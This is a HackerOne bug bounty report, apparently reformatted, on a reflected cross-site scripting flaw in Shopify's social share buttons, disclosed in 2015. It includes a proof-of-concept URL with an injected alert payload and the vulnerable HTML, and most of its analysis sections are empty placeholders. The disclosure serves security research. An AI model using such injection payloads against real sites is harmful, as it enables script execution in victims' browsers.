# www.shopify.com XSS on blog pages via sharing buttons

## Metadata
- **Source:** HackerOne
- **Report:** 87168 | https://hackerone.com/reports/87168
- **Submitted:** 2015-09-03
- **Reporter:** reactors08
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
social sharing buttons (facebook and linkedin) vulnerable to xss at `www.shopify.com/guides/*` `www.shopify.com/videos/*` and `www.shopify.com/success-stories/*`

steps to reproduce:
- go to page `https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//`
- share this page by clicking facebook or linkedin sharing button

page contains malicious js:
`<a class="icon social-shares__icon icon-

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

social sharing buttons (facebook and linkedin) vulnerable to xss at `www.shopify.com/guides/*` `www.shopify.com/videos/*` and `www.shopify.com/success-stories/*`

steps to reproduce:
- go to page `https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//`
- share this page by clicking facebook or linkedin sharing button

page contains malicious js:
`<a class="icon social-shares__icon icon-facebook--square" onclick="window.open('http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes'); return false;" href="http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes" data-ga-event="Blog" data-ga-action="Facebook share">
    <span class="visuallyhidden">Facebook</span>
  </a>`




</details>

---
*Analysed by Claude on 2026-05-24*
